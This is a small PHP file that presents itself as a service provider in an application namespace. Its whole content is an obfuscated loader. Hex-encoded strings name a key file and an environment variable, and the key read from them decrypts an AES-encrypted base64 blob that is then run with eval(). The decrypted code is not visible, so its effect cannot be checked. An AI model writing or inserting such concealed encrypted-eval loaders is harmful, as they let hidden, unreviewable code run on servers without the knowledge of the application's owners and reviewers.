<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('G0t7pg9y4uuopzt7HpwLuQ==');

$c=base64_decode(

'eKfw2k4M60WHmNTEJdTcWikKAce8/g9I+8iVt1fHzKGlZtVJh+ZspbjZOyQlUPQP/icuTgDTAwhA' .
'KqqG8Z9Cr/qGkszfItxNH2AJWyx4O3p9mZOrutNzZYF6H0Rb0AvgOMr9MKKY29J32cx0WbWkllqr' .
'Ni5nFxROM9iqXDB7i4rYUMvQ7+L8h5TBhW8BjLFbTnqBqug5WtvouSEPMrZ/X8jb+T0/0pOk7Ioy' .
'FRvlUAXfOe5kd0ItBXrhXRgPh4MABbev09U6MihnAj/T60PS53V3jfHvQvwggM6qT7UJ/AdvFNGi' .
'nmhg9eHafV508gJf7Qb2w0WUJ/aEcQbOE168CAMY6pgpDxFiWAPoCqAPpT0LS5UsOS85sBKDbFXR' .
'P/itj2Ei+L3aoWblTTKscONgWH0/iSBcFXUokokssVgo9qi1s/RP+wcppbSjyj/GpdsvVKISBt1N' .
'ABRqVqd/YYFMPQxSygi+SZJlh1BAmqLq6PK+AKtATcXuUe2jUxkQqnFeTG1BFi3xBFC2WvtFQ7g0' .
'QhR2UntI3TCYe1a1jfPkHnooK9qQqgn5lOQsKm0KkcTfcNytEmoOiodAeLCk9fXn874e0cU5Zao9' .
'+42eBLIpe5do40NAFgnqOn/OF9RY41kP+G7VsV06WNy48qgCaSkO34jyeWYjL9RtH3fGx31guITN' .
'JmAV0w1/ZOyq8oAu4G0DkTs9j6S9KBLqbVhM9qeiLZWBfhsX5IaTzr3Vbc/JXYqB2EMlURCXeA5S' .
'7wgyXWMe9Af6satKGN4Ckn1s3BSuUqlFom/g4Ei44lDXfxDmYpQ9BdgftSwb30Ny/8qDs7uzLwXY' .
'zDzKFD/VaZzh+VRhjI02SI5tj12gDSqe8KgsYY5rFFEC+9THBtYKhqDMoGCOy/IaAEIK7lfYqPWK' .
'lcvP7DIiZXwRJVTCy1rsP4Lh+5ihoTUEvUZerTdncagsvhbX'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

